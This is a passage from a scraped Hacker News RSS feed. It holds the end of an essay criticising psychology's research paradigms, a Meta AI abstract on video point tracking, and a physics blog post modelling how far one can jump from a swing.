rel="">10,000+</a><span> citations of his work now point nowhere, and it makes no difference.</span></p><p><span>As a young psychologist, this chills me to my bones. Apparently is possible to reach the stratosphere of scientific achievement, to publish over and over again in “high impact” journals, to rack up tens of thousands of citations, and for </span><em>none of it to matter</em><span>. Every marker of success, the things that are supposed to tell you that you're on the right track, that you're making a real contribution to science—they might mean nothing at all. So, uh, what exactly am I doing?</span></p><p><span>But hey, these are just three people, albeit three pretty famous people. Maybe the impact of any single scientist is simply too small to be seen from a distance. If you deleted a whole bunch of papers from across the literature, though, </span><em>that </em><span>would really make a difference, and we’d have to rebuild big parts of the field from the ground up. Right?</span></p><p><span>No, not really. We did delete those papers, and nothing much happened. In 2015, a big team of researchers tried to redo 100 psychology studies, and about </span><a href="https://eprints.keele.ac.uk/id/eprint/877/1/Open%20Science%20%28Science%20Pre-Print%29.pdf" rel="">60%</a><span> failed to replicate.</span></p><p><span> This finding made big waves and headlines, and it's already been cited nearly 8,000 times.</span></p><p><span>But the next time someone brings it up, ask them to name as many of the 100 studies as they can. My bet is they top out at zero. I'm basically at zero myself, and I've written about that study </span><a href="https://www.experimental-history.com/p/psychology-might-be-a-big-stinkin" rel="">at length</a><span>. (I asked a few of my colleagues in case I'm just uniquely stupid, and their answers were: 0, 0, 0, 0, 1, and 3.)</span></p><p><span>This is really weird. Imagine if someone told you that 60% of your loved ones had died in a plane crash. Your first reaction might be disbelief and horror—“Why were 60% of my loved ones on the same plane? Were they all hanging out without me?”—but then you would want to know </span><em>who</em><span> died. Because that really matters! The people you love are not interchangeable! Was it your mom, your best friend, or what? It would be insane to only remember the 60% statistic and then, whenever someone asked you who died in that horrible plane crash, respond, “Hmm, you know, I never really looked into it. Maybe, um, Uncle Fred? Or my friend Clarissa? It was definitely 60% of my loved ones, though, whoever it was.”</span></p><p>So if you hear that 60% of papers in your field don’t replicate, shouldn't you care a lot about which ones? Why didn't my colleagues and I immediately open up that paper's supplement, click on the 100 links, and check whether any of our most beloved findings died? The answer has to be, “We just didn't think it was an important thing to do.” We heard about the plane crash and we didn't even bother to check the list of casualties. What a damning indictment of our field!</p><p><span>(For more on this, see </span><a href="https://www.experimental-history.com/p/psychology-might-be-a-big-stinkin" rel="">Psychology might be a big stinkin' load of hogwash and that's just fine</a><span>).</span></p><p><span>All of this is pretty distressing, but it feels a little better when you remember that </span><a href="https://www.experimental-history.com/p/science-is-a-strong-link-problem" rel="">science is a strong-link problem</a><span>. That's why you can disappear entire careers and shoot holes through the literature without losing anything. Fields are mostly flab, so you're unlikely to hit any vital organs.</span></p><p>Okay, so where are psychology's strong links? Well, earlier this year, the psychologist Paul Bloom asked exactly this question on Twitter:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png" width="603" height="238" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:238,&quot;width&quot;:603,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>A bunch of psychologists weighed in, and their </span><a href="https://twitter.com/paulbloomatyale/status/1619737276585758722?s=43&amp;t=dI45tzZfqhqaAR30Pr-_uA" rel="">responses</a><span> bring me a deep sense of despair:</span></p><p>“psychopathology symptoms have small world network properties”</p><p>“people's bodies and brains synchronize when they are interacting”</p><p>“monkeys can use money (and pay for sex)”</p><p><span>Look, this isn't a systematic study; it's just a person asking for opinions on the internet. (Although, most of what psychology considers systematic studies are, in fact, just a person asking for opinions on the internet.) Plenty of these findings are interesting and some are useful (especially if you are a rich, lonely monkey). I think there's some terrific psychology that doesn't get mentioned here; I highlight some in </span><a href="https://www.experimental-history.com/p/underrated-ideas-in-psychology" rel="">Underrated ideas in psychology</a><span>.</span></p><p><span>But there's no world-changing insight like relativity, evolution, or DNA, nor any smaller-but-still-very-cool discoveries like polymerase chain reaction, CRISPR, or Higgs bosons. Only a few psychological discoveries are mentioned by more than one commenter, except for “most psychology studies are bunk.” If Bloom can't think of any major recent discoveries, and if none of his friends can agree on any major recent discoveries, then maybe there </span><em>aren't</em><span> any major recent discoveries.</span></p><p>(I know that might be a bummer to hear, but don't shoot the messenger. Besides, good luck trying to shoot a bunch of bees.)</p><p>Why doesn't psychology have more to show for itself? What's slowing us down?</p><p><span>Every science has its </span><a href="https://en.wikipedia.org/wiki/Paradigm" rel="">paradigms</a><span>, models of how things work and how you study them. Psychology doesn’t exactly have a paradigm; we’re still too young for that. But we do have ways of doing things, bundles of assumptions and practices that get handed down and spread around. Call ‘em proto-paradigms. We’re currently stuck with two proto-paradigms that were once useful but aren’t anymore, and one proto-paradigm that was never useful and will never be.</span></p><p><span>The first of the formerly useful ones will be familiar: this whole cognitive bias craze. Yes, humans do not always obey the optimal rules of decision-making, and this insight has won two </span><a href="https://www.nobelprize.org/prizes/economic-sciences/2017/summary/" rel="">Nobel</a><span> </span><a href="https://www.nobelprize.org/prizes/economic-sciences/2002/summary/" rel="">Prizes</a><span>. That's great! Well done, everyone. But we've been piling up cognitive biases since 1973, and the last 100 biases we added to the pile don’t seem to have done much. Adding the next 100 will probably do even less. It's time to </span><a href="https://worksinprogress.co/issue/biases-the-wrong-model" rel="">stop piling</a><span>.</span></p><p><span>The second formerly useful proto-paradigm is something like “situations matter.” This idea maintains that people's contexts have immense power over their behavior, and the strongest version maintains that the only difference between sinners and saints is their situations. The most famous psychology studies of all time are “situations matter” studies: the </span><a href="https://www.experimental-history.com/p/the-secret-shock-study" rel="">Milgram shock experiments</a><span>, the </span><a href="https://en.wikipedia.org/wiki/Asch_conformity_experiments" rel="">Asch conformity studies</a><span>, the </span><a href="https://en.wikipedia.org/wiki/Bystander_effect" rel="">bystander effect</a><span>, the </span><a href="https://www.prisonexp.org/" rel="">Stanford Prison Experiment</a><span> (since </span><a href="https://gwern.net/doc/psychology/2019-letexier.pdf" rel="">revealed</a><span> to be much more of a scripted play than a study). The now-much-ridiculed “social priming” studies, like the </span><a href="https://web.mit.edu/curhan/www/docs/Articles/15341_Readings/Social_Cognition/Bargh_et_al_1996_Automaticity_of_social_behavior.pdf" rel="">one</a><span> where you unscramble words about being old and then walk more slowly, are also “situations matter” studies. So are “</span><a href="https://en.wikipedia.org/wiki/Nudge_theory#:~:text=Nudges%20are%20small%20changes%20in,salience%20of%20the%20desired%20option." rel="">nudges</a><span>,” where tiny changes in situations bring big changes in behavior, like redoing the layout of a cafeteria to encourage people to eat more veggies.</span></p><p><span>This proto-paradigm, too, has run its course. Yes, situations influence people's behavior, more so than we would have once expected. But humans are not brainless automatons tossed about by their circumstances. That's why the most magical-seeming social priming studies keep </span><a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0029081" rel="">failing</a><a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0056515" rel=""> to</a><a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0072467" rel=""> replicate</a><span>, including the “unscrambling words about old people makes you walk slower,” one, and </span><a href="https://www.researchgate.net/publication/256111575_Out_Damned_Spot_Can_the_Macbeth_Effect_Be_Replicated" rel="">the one</a><span> where people desire cleaning products more after you make them think about being unethical (similar to Gino Study #1 above). Small changes in situations </span><em>can </em><span>have big effects, but </span><a href="https://www.pnas.org/doi/full/10.1073/pnas.2200300119" rel="">they often don't have any effect at all</a><span> (like Gino Study #4). Situations certainly matter, and we've got 70 years of studies to thank for that, but they aren't </span><em>all </em><span>that matters, and another 70 years of studies won't change either of those facts.</span></p><p>The third proto-paradigm has never been scientifically productive, and won't ever be. It's also a little harder to explain. Let's call this one “pick a noun and study it.”</p><p><span>Humans are very good at believing in useful fictions. The Ford Motor Company, for example, doesn't really exist in the way that you or I exist, or in the way that Jupiter exists, or even the way that a Ford F-150 exists. The Ford Motor Company is not its buildings, its CEO, its thousands of employees, its corporate charter, or its bank accounts; it's all those things, and then some. So even though “The Ford Motor Company” doesn’t exist in the normal way, believing in it is useful—it allows lots people to work together, make cars, and get paid. It also makes it easy for us to say things like “Ford fired its CEO” and “Ford reached a deal with the auto union” and “Ford still </span><a href="https://www.freep.com/story/money/cars/ford/2020/07/29/ford-government-loan-department-energy-debt/5526413002/" rel="">owes</a><span> the government money.”</span></p><p>Psychology also employs lots of fictions. Attitudes, norms, depression, the self, stereotypes, emotions, ideology, personality, creativity, morality, intelligence, stress—none of these things actually exist. They are abstract words we use to describe the things people do and the stuff that happens in their minds. It’s hard to talk about psychology without using them, so it’s easy to forget they’re just words.</p><p><span>In the “pick a noun and study it” proto-paradigm, you take one of these fictions and gather some data on it. For example, you could spend a thousand careers studying a fiction like </span><em>leadership</em><span>. How much do people value leadership? Can leadership predict a company's performance? Are there cross-cultural differences in leadership? Does leadership relate to other fictions, like ideology or creativity?</span></p><p>“Pick a noun and study it” has three fatal flaws. First, there's this whole tricky issue about fictions being fictional. You can't study leadership directly, so you have to turn it into something nonfictional that you can measure. “Studying leadership,” then, actually means studying responses to the Oregon Leadership Inventory or whatever, or counting the “leader-like” words that people use, or correlating the ratings that people give to their bosses. You could be watching little league soccer teams, or corporate board meetings, or subway conductors, and all this can get crammed under the heading of “studying leadership,” even though it’s possible that none of it has anything to do with anything else. This is about as useful as a grocery store that has one big section labeled “ITEMS.”</p><p>Second, “pick a noun” always gives you results. How much do people value leadership? More than zero, no doubt. Can leadership predict a company's performance? With your infinite freedom to define and measure leadership however you want, it sure can. Are there cross-cultural differences in leadership? Keep looking and you'll find some eventually.</p><p><span>And third, “pick a noun” never tells you to stop. How many leadership studies are required before we understand leadership? 500? 1,000? 1 million? How would we know? There are always more questions we can ask about leadership, more fictions we can correlate it with, more ways we can define it. It's a perpetual motion machine, a </span><a href="https://www.theintrinsicperspective.com/p/publish-and-perish" rel="">science game</a><span> that never ends.</span></p><p>So, some fictions are useful. We know the Ford Motor Company is a useful fiction because people use it every day to make cars. Psychological fictions are, so far, mainly useful for producing papers.</p><p>In other sciences, paradigms get overturned when they stop being able to explain the data coming in. If your theory can't account for why Neptune is over there right now, it's going to lose out to a theory that can.</p><p><span>Unfortunately, “humans are biased,” “situations matter,” and “pick a noun,” are unfalsifiable and inexhaustible. Nobody's ever going to prove that, actually, humans obey the laws of optimal decision making all the time. Nobody will show that situations don't matter at all. Nobody is going to demonstrate that leadership, creativity, or “</span><a href="https://en.wikipedia.org/wiki/Social_cryptomnesia" rel="">social cryptomnesia</a><span>” don’t exist. And we're never going to run out of biases, situations, or words. It's horrifying to think, but these proto-paradigms could be immortal.</span></p><p><span>But immortal does not mean invulnerable. Another way that paradigms die is people simply lose interest in them, so our best ally against these zombie paradigms is </span><em>boredom</em><span>. And we've got plenty. Psychologists already barely care about the findings in their own field; that's why, when we hear about another replication massacre, we don't even bother to ID the bodies. We're hungry for something that makes us </span><em>feel</em><span>. A few decades from now, when a wizened Bloom asks his question again, we hope for a world where people pile into the comments with major discoveries. Or, better yet, a world where Bloom doesn't even have to ask in the first place, because the answer is so obvious. (Imagine a computer scientist asking Twitter, “Hey guys, anybody hear about any big breakthroughs in computer science in the past few decades?”)</span></p><p>So yes, it's a shame when we find out that esteemed members of our community might have made up data. That's bad, and they shouldn't do it. But catching the cheaters won't bring our field back to life. Only new ideas can do that. Sweet, sweet ideas, ideas that matter, ideas that you can build on, ideas that would take something with them if they disappeared. That's what I'm going to look for, and fortunately I am good at searching for sweet things and reporting back about their location, because I am not a human at all, but a bunch of bees.</p><p>(Please don't sue me.)</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Meta AI releases CoTracker, a model for tracking any points (pixels) on a video (211 pts)]]></title>
            <link>https://co-tracker.github.io/</link>
            <guid>37314073</guid>
            <pubDate>Tue, 29 Aug 2023 21:04:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://co-tracker.github.io/">https://co-tracker.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=37314073">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p>
              Methods for video motion prediction either estimate jointly the instantaneous motion
              of all points in a given video frame using optical flow, or track the motion of individual points
              throughout the video, but independently.
              The latter is true even for powerful deep learning methods that can track points through occlusions.
              Tracking points individually ignores the strong correlation that can exist between the points, for
              instance when they arise from the same physical object, potentially harming performance.
            </p>
            <p>
              In this paper, we thus propose CoTracker, an architecture that jointly tracks multiple points throughout
              an entire video.
              This architecture is based on several ideas from the optical flow and tracking literature, and combines
              them in a new,
              flexible and powerful design. It is based on a transformer network that models the correlation of
              different points in time via specialised attention layers.
            </p>
            <p>
            The transformer is designed to update iteratively an estimate of several trajectories.
            It can be applied in a sliding-window manner to very long videos, for which we engineer an unrolled
            training
            loop.
            It compares favourably against state-of-the-art point tracking methods, both in terms of efficiency and
            accuracy.

            </p>

          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How far can you jump from a swing? (197 pts)]]></title>
            <link>https://www.alexmolas.com/2023/08/18/how-far-can-you-jump.html</link>
            <guid>37313493</guid>
            <pubDate>Tue, 29 Aug 2023 20:26:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.alexmolas.com/2023/08/18/how-far-can-you-jump.html">https://www.alexmolas.com/2023/08/18/how-far-can-you-jump.html</a>, See on <a href="https://news.ycombinator.com/item?id=37313493">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    


  <title>How far can you jump from a swing?</title>
  
  
  
  
  
    
  


  <!-- Header -->
  

  <!-- Post Content -->
    <a href="https://www.alexmolas.com/">Back to Home</a>
    <hr>
    
    <i><p>August 18, 2023</p></i>
      <blockquote>
  <p>Discussion on <a href="https://news.ycombinator.com/item?id=37313493">HackerNews</a>.<br>
Some people pointed out some flaws in my modelling (eg: assuming zero distance from swing to floor) which I’ve tried to fix.  The original maximum distance estimation was around $1m$.</p>
</blockquote>

<p>This summer I’ve spent an absurd amount of time reading and learning about the physics of swings. Yes, you read it right, I’ve been learning about the physical processes that happen when a kid is playing with a swing in the park. Blame it on my kids and the countless hours spent enjoying these moments with them. In particular, I read about the physics of pumping a swing and about the physics of jumping from a swing. Amidst my deep dive into swing physics, I came up with a new Olympic sport in which you start seated on a swing with length $L$, your feet comfortably touching the ground. As a countdown of $T$ seconds commences, you embark on the art of swing-pumping. Your challenge is to execute a skillful leap before the countdown reaches zero. With your jump, you travel a distance $d$ from your initial point, aiming to achieve the greatest possible $d$.</p>

<p>The question is then, which is the best method to maximize $d$?</p>

<p>Before I present you with the answer to the question I’ll summarize the learnings I got from reading about the physics of a swing. As usual, you can find all the code I used for this post in my <a href="https://github.com/alexmolas/alexmolas.github.io/tree/master/notebooks/swing">repo</a>.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/swing_drawing.png" alt="Swing Drawing" width="300">
  <figcaption>I love this image, and I wish more papers had this kind of picture on them. Image from [^2]</figcaption>
</figure>
<p>Notice that <sup id="fnref:4" role="doc-noteref"><a href="#fn:4" rel="footnote">1</a></sup> and <sup id="fnref:5" role="doc-noteref"><a href="#fn:5" rel="footnote">2</a></sup> answer a very similar question: what is the optimal time $t$ to jump off, so as to reach farthest. However, these references do not deal with the pumping of a swing, they just assume that you start swinging at some angle $\lambda$ and jump at an angle $\phi$, without pumping the swing at any point. Solving this problem is interesting, but I think it’s more exciting to solve it when the person swinging can control the system. This makes it feel more like a real game that you can play in a park or at the Olympic Games.</p>

<h2 id="pumping-a-swing">Pumping a swing</h2>

<p>There are several papers about the pumping of a swing <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">3</a></sup>, <sup id="fnref:2" role="doc-noteref"><a href="#fn:2" rel="footnote">4</a></sup>, and <sup id="fnref:3" role="doc-noteref"><a href="#fn:3" rel="footnote">5</a></sup> and much more. In this section, I’ll focus in particular on <sup id="fnref:2:1" role="doc-noteref"><a href="#fn:2" rel="footnote">4</a></sup>.</p>

<p>The model for a swing I’ll use is a rigid dumbbell made up of three masses, suspended by a rigid rod of length $l_1$ attached to the middle mass $m_1$. The distances from $m_1$ to the other masses $m_2$ and $m_3$ are $l_2$ and $l_3$ respectively. The angle of the rod $l_1$ with the vertical is $\phi$ and the angle of the dumbbell with the rod is $\theta$. In the next figure, you can see a diagram of the system</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/swing_diagram.png" alt="Swing diagram" width="500">
</figure>

<p>The Lagrangian of this system is</p>

\[\begin{align}
\mathcal{L} = &amp; \frac{1}{2} I_1 \dot\phi^2 + \frac{1}{2} I_2 \left(\dot\phi + \dot\theta\right)^2 - l_1 N \dot\phi\left( \dot \phi + \dot\theta \right) \cos \theta \\
&amp;+ M l_1 g \cos \phi - N g \cos\left(\phi + \theta\right)
\end{align}\]

<p>where $M = m_1 + m_2 + m_3$, $N = m_3 l_3 - m_2 l_2$, $I_1 = M l_1^2$, and $I_2 = m_2 l_2^2 + m_3 l_3^2$. Therefore, the Lagrange’s equation for $\phi$ is</p>

\[\begin{align}
(I_1 + I_2) \ddot \phi + M l_1 \sin \phi = &amp; -I_2 \ddot \theta - l_1 N \dot\theta^2 \sin \theta \\
&amp; + l_1 N \dot\theta^2 \cos \theta + N g \sin(\phi + \theta) \\
&amp; - 2 l_1 N \dot \theta \dot \phi \sin \theta \\
&amp; + 2l_1 N \ddot \phi \cos \theta
\end{align}\]

<p>The paper proceeds by assuming the swinger pumps the swing by forcing $\theta(t) = \theta_0 \cos(\omega t)$, where $\omega$ is the natural angular frequency of the pendulum. Then, they show that there are two regimes, one where $\phi &lt; \phi_{\text{crit}}$ where the movement is like an harmonic driven oscillator, and another one where $\phi &gt; \phi_{\text{crit}}$ where the movement is an harmonic oscillator with parametric terms. They then analyze the different regimes and solve their equations. In summary, they show that for small amplitudes the swing follows the equation</p>

\[\ddot \phi + \omega_0^2\phi = F \cos(\omega t)\]

<p>where</p>

\[\begin{align}
&amp;\omega_0= K_0/I_0\\
&amp;I_0=I_1 + I_2 - 2l_1 N (1 - \theta_0^2/4 )\\
&amp;K_0=Ml_1g - Ng(1 - \theta_0^2/4)\\
&amp;F=\theta_0 \left[ (\omega^2 I_2 + N(g - \omega_0^2l_1)(1 - \theta_0^2/8)\right]/I_0
\end{align}\]

<p>The differential equation has the solution</p>

\[\phi(t) = \left(\frac{F}{\omega_0^2 - \omega^2}\right)\left(\cos \omega t - \cos \omega_0t\right)\]

<p>which looks like for small $t$</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/phi_t.svg" alt="phi(t)" width="500">
  <figcaption>Solution for $\phi(t)$, with $F=0.085$, $\omega=2.21$, $\omega_0=2.23$</figcaption>
</figure>

<p>This solution is good enough for our approach since I assume $T$ to be small enough to avoid the swinger pumping the swing to big $\phi$ values.</p>

<h2 id="jumping-from-a-swing">Jumping from a swing</h2>

<p>Now let’s study how should a swinger jump from a swing to maximize the traveled distance. The analysis presented here is based on the work of Jason Cole <sup id="fnref:4:1" role="doc-noteref"><a href="#fn:4" rel="footnote">1</a></sup> and Hiroyuki Shima <sup id="fnref:5:1" role="doc-noteref"><a href="#fn:5" rel="footnote">2</a></sup>. Notice that the naive solution of jumping at $\phi=\pi/4$ is not optimal. For instance, imagine a swing that oscillates in the range $\pm \pi/4$, then it’s clear that jumping at $\pi/4$ is suboptimal since the swinger will start its flight with a speed of zero.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/swing_jump.png" alt="Jumping from a swing" width="500">
  <figcaption>Diagram showing the situation just after jumping from the swing. Notice that instead of $h$ I'm using $l_1$, and I'm using $h$ as the distance from the swing to the ground, sorry for the confusing notation. Image from [^4]. </figcaption>
</figure>

<p>Notice I’m adding a new variable $h$ that represents the distance from the swing to the ground. This variable is not present on Jason’s blog but it’s on Hiroyuki paper. Once you jump from the swing, the equations of motion for the horizontal and the vertical directions are</p>

\[\begin{cases}
x(t) = l_1 \sin \phi + v t\cos\phi \\
y(t) = h + l_1(1 - \cos \phi) + vt \sin \phi - \frac{1}{2}gt^2 
\end{cases}\]

<p>Now, we can compute the total flight time by solving $y(t_{\text{flight}})=0$ and then compute the flight distance as $d = x(t_{\text{flight}})$. The flight time is then</p>

\[t_{\text{flight}} = \frac{v\sin\phi \pm\sqrt{v^2\sin^2\phi+2g(h+l_1(1-\cos\phi))}}{g}\]

<p>now notice that only the positive root has physical meaning (we don’t want negative times), so the distance is</p>

\[\begin{align}
d = &amp; l_1 \sin\phi + \frac{v^2 \sin\phi\cos\phi}{g} \\
&amp; + \sqrt{\frac{2v^2\cos^2\phi(h+l_1(1-\cos\phi))}{g}+\left(\frac{v^2\sin\phi\cos\phi}{g}\right)^2}
\end{align}\]

<h2 id="putting-everything-together">Putting everything together</h2>

<p>We have now all the pieces we need to solve the problem. On one hand, we can compute the swinger angle $\phi$ for any given $t$, and we can also compute the distance that the swinger will travel when leaving the swing at an angle $\phi$.</p>

<p>Notice that to compute $d$ we need to know $v$. In other sources that study this problem, they get $v$ by using energy conservation, however, in our case, we know $\phi(t)$ and we can get the initial velocity after leaving the swing as $v(t) = l_1 \frac{d}{dt} \phi(t)$</p>

\[v(t) = \frac{l_1F}{\omega^2_0 - \omega^2}(\omega\cos\omega t - \omega_0\cos \omega_0 t)\]

<p>Now, putting everything together we have this set of equations</p>

\[\begin{cases}
d(t) =l_1 \sin\phi(t) + \frac{v^2 \sin\phi(t)\cos\phi(t)}{g} + \sqrt{\frac{2v^2\cos^2\phi(h+l_1(1-\cos\phi))}{g}+\left(\frac{v(t)^2\sin\phi(t)\cos\phi(t)}{g}\right)^2} \\

\phi(t) = \frac{F}{\omega_0^2 - \omega^2}\left(\cos \omega t - \cos \omega_0t\right) \\

v(t) = \frac{l_1F}{\omega^2_0 - \omega^2}(\omega\cos\omega t - \omega_0\cos \omega_0 t)
\end{cases}\]

<p>To compute $d(t)$ we just need to compute $\phi(t)$ and $v(t)$ and substitute the values in the first equation. I’ll use the following constants: $M=1$, $m_1=0.4M$, $m_2 = 0.2M$, $m_3 = 0.4M$, $l_1 = 2$, $l_2 = 0.4$, $l_3 = 0.4$, $h=l_3$, $\theta_0=1$, $g= 9.8$, $T=2 \pi \sqrt{l1 / g}$, and $\omega= 2\pi/T$</p>

<p>With these parameters, we can now plot the traveled distance as a function of the jumping time.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/distance_vs_t.svg" alt="Traveled distance as a function of jumping time" width="500">
</figure>

<p>Let’s remember that we’re interested in the optimal jumping time $t^*$ for a given maximum time $T$. To do so we just need to fix a time $T$ and find at which $t^* &lt; T$ the distance $d(t)$ is maximized. I did that numerically and plotted the results in the next image</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/optimal_time.svg" alt="Optimal jumping time" width="500">
</figure>

<p>Of course, the optimal jumping time follows a ladder-like curve. This is because you’re not interested in jumping backward, and sometimes it’s better to jump some seconds before $T$ than to wait for $T$ and find yourself in a worse position.</p>

<p>Finally, we can get also the maximum traveled distance as a function of $T$.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/max_distance.svg" alt="Traveled distance as a function of jumping time" width="500">
</figure>

<p>For example, if $T=20s$, which seems like a reasonable value to make the sport interesting, one would expect to achieve $d\approx 2m$.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Well, that’s all for today. In this post, I’ve presented a new Olympic sport that consists of pumping on a swing during a given amount of time and then jumping and trying to achieve the maximum distance. With the parameters used in my simulations, I would expect the world record to be around two meters.</p>

<p>The analysis presented here is full of simplifications. Here I list some of the ones I’m aware of</p>

<ul>
  <li>The swinger model is oversimplified. For instance, authors in <sup id="fnref:3:1" role="doc-noteref"><a href="#fn:3" rel="footnote">5</a></sup> present a model which is more accurate than the one used here. However, I wanted to keep the analysis “simple”.</li>
  <li>The swinger is assumed to operate in the regime of small $\phi$, which allows us to use an analytical equation for $\phi(t)$. However, an experimented swinger could achieve big oscillation angles in a short amount of time, and then our simplification wouldn’t be valid anymore.</li>
  <li>As a good physicist I’ve neglected any kind of friction (swing-rod, swinger-air, etc.).</li>
</ul>

<p>Even with all this simplification, I think the analysis stills bring some light to the problem of maximizing the flight distance. Now, the only step still missing is the experimental one: go to a park and try to beat the theoretical maximum distance. According to my numbers, you wouldn’t be able to beat the 2-meter mark.</p>

<p>All of this reminds me of the anecdote of the mathematician and his wife moving a sofa. The mathematician spent a lot of time computing if it was possible to move the sofa from one room to the other, and finally proved it was impossible. Then he went to show it to his wife, which had already moved the sofa to the other room. So I’m pretty sure that it’s going to be possible to beat my theoretical maximum distance. Unfortunately, I don’t have a swing near me right now, so I’ll have to wait until the next visit to the park.</p>

<hr>

<h2 id="appendix-1-optimal-distribution-of-masses">Appendix 1: optimal distribution of masses</h2>

<p>Some days after publishing this post I started wondering which was the combination of masses $m_1$, $m_2$, and $m_3$ that allowed for the best results, aka how should a Swing Jumping world champion look like. To do so I have fixed all the parameters except the masses, and I’ve forced $1 = m_1 + m_2 + m_3$ since the behavior of the system is independent of the total mass $M$.</p>

<p>In the next plot we see how the maximum distance depends on $m_2$ and $m_3$. The red star shows where the combination of masses that maximized the distance.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/distance_vs_masses.png" alt="$m1$ &amp; $m2$ vs max distance" width="500">
</figure>

<p>The best combination of masses is $m_1=0$, $m_2 \approx 0.625$ and $m_3 \approx 0.375$. Of course this is not a solution that’s feasible - maybe . Setting a minimum value for $m_1 &gt; 0.1$ we get a different optimal distribution of masses, ie: $m_1\approx 0.2$, $m_2 \approx 0.5$, and $m_3 \approx 0.3$. So we see that the optimal solution is always to minimize $m_1$.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/distance_vs_masses_clipped.png" alt="$m1$ &amp; $m2$ vs max distance for a clipped value of $m1$" width="500">
</figure>

<p>With these new masses the maxiumum distance is around $3m$ which is considerably higher than our first result.</p>

<p>We could also analyze the best combination of lengths $l_*$ and masses $m_*$ that maximize the distance, however I don’t think it’s going to add a lot of value to the study so I’ll leave the analysis as it is now.</p>

<hr>




  <!-- Footer -->
  



  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[ISPs Should Not Police Online Speech – No Matter How Awful It Is (887 pts)]]></title>
            <link>https://www.eff.org/deeplinks/2023/08/isps-should-not-police-online-speech-no-matter-how-awful-it</link>
            <guid>37313349</guid>
            <pubDate>Tue, 29 Aug 2023 20:17:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eff.org/deeplinks/2023/08/isps-should-not-police-online-speech-no-matter-how-awful-it">https://www.eff.org/deeplinks/2023/08/isps-should-not-police-online-speech-no-matter-how-awful-it</a>, See on <a href="https://news.ycombinator.com/item?id=37313349">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article role="article">
  
  
